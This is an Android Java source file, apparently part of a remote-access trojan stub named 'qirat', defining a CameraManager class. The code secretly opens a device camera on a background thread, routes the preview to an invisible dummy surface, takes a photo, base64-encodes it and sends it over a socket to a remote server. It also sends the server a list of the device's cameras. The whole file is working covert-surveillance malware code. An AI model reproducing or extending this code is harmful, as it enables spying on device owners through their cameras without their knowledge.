package com.qirat.stub;

import android.content.Context;
import android.content.pm.PackageManager;
import android.graphics.SurfaceTexture;
import android.hardware.Camera;
import android.util.Base64;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;


public class CameraManager {

    private static final String TAG = "CameraManager";
    private Context context;

    public CameraManager(Context context) {
        this.context = context.getApplicationContext();
    }


    public void takePhoto(final int cameraId, final int quality) {
        new Thread(() -> {
            Camera camera = null;
            try {

                camera = Camera.open(cameraId);
                

                Camera.Parameters params = camera.getParameters();
                params.setJpegQuality(quality);
                

                try {
                    Camera.Size smallestSize = null;
                    for (Camera.Size size : params.getSupportedPreviewSizes()) {
                        if (smallestSize == null || size.width < smallestSize.width) {
                            smallestSize = size;
                        }
                    }
                    if (smallestSize != null && smallestSize.width >= 320) {
                        params.setPreviewSize(smallestSize.width, smallestSize.height);
                    }
                } catch (Exception e) {
                    Log.w(TAG, "Could not set preview size: " + e.getMessage());
                }
                
                camera.setParameters(params);
                

                SurfaceTexture dummy = new SurfaceTexture(0);
                camera.setPreviewTexture(dummy);
                camera.startPreview();
                

                Thread.sleep(300);
                
                final Camera finalCamera = camera;
                

                camera.takePicture(null, null, new Camera.PictureCallback() {
                    @Override
                    public void onPictureTaken(byte[] data, Camera camera) {
                        try {

                            String base64Image = Base64.encodeToString(data, Base64.NO_WRAP);
                            

                            JSONObject json = new JSONObject();
                            json.put("type", "photo");
                            json.put("image", base64Image);
                            

                            Socket socket = Socket.getInstance(context);
                            if (socket.isConnected()) {
                                socket.sendData("PHOTO:" + json.toString());
                                Log.d(TAG, "Photo sent successfully");
                            }
                        } catch (Exception e) {
                            Log.e(TAG, "Error sending photo: " + e.getMessage());
                        } finally {

                            try {
                                finalCamera.stopPreview();
                                finalCamera.release();
                            } catch (Exception e) {
                                Log.e(TAG, "Error releasing camera: " + e.getMessage());
                            }
                        }
                    }
                });
                
            } catch (Exception e) {
                Log.e(TAG, "Error taking photo: " + e.getMessage());
                if (camera != null) {
                    try {
                        camera.release();
                    } catch (Exception ex) {
                        // Ignore
                    }
                }
            }
        }).start();
    }
    

    public static void sendCameraListToServer(Context context) {
        new Thread(() -> {
            try {
                if (!context.getPackageManager().hasSystemFeature(PackageManager.FEATURE_CAMERA_ANY)) {
                    Log.w(TAG, "No camera available");
                    return;
                }

                JSONObject cameras = new JSONObject();
                JSONArray list = new JSONArray();

                int numberOfCameras = Camera.getNumberOfCameras();
                for (int i = 0; i < numberOfCameras; i++) {
                    Camera.CameraInfo info = new Camera.CameraInfo();
                    Camera.getCameraInfo(i, info);
                    
                    JSONObject cam = new JSONObject();
                    cam.put("id", i);
                    cam.put("name", info.facing == Camera.CameraInfo.CAMERA_FACING_FRONT ? "Front" : "Back");
                    list.put(cam);
                }
                
                cameras.put("cameraList", list);
                
                Socket socket = Socket.getInstance(context);
                if (socket.isConnected()) {
                    socket.sendData("CAMERA_LIST:" + cameras.toString());
                    Log.d(TAG, "Camera list sent");
                }
            } catch (Exception e) {
                Log.e(TAG, "Error sending camera list: " + e.getMessage());
            }
        }).start();
    }
}
